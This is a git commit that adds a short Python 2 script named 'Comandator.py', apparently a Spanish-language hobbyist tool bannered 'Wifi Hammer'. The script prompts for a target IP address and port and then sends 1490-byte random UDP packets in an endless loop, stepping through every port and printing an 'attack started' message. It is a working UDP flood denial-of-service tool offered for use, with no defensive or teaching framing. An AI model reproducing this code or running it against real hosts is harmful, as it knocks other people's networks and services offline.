b62c4b41be18958c411f7c3019e90ca7898e231b
Comandator <44918048+comandator@users.noreply.github.com>
2019-04-28 16:24:40 -0700

    Add files via upload

---
+++ Comandator.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python
+import socket, os, random, time
+
+# Color
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+# Code time ##################
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############################
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+print "================================"
+print "    ~o~o~: Wifi Hammer:~o~o~"
+print "  Hecho Por Comandator Estudios"
+print "================================"
+ip = raw_input('[$] IP: ')
+port = input('[$] Puerto: ')
+os.system("clear")
+print "attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+time.sleep(3)
+print
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
